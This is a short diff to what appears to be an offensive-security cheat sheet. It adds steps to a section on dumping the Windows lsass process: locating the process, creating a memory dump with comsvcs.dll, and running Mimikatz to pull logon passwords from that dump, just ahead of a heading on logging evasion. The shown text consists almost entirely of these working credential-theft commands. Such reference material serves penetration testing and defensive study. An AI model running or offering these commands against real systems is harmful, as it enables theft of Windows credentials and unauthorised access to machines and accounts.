@@ -213,8 +213,10 @@ ls C:\Windows\system32\CodeIntegrity
 
 #### For example dumping lsass:
 ```
+Get-Process | Select-String lsass
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
 dir C:\Users\Public\lsass.dmp
+Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords"'
 ```
 
 ### Logging evasion
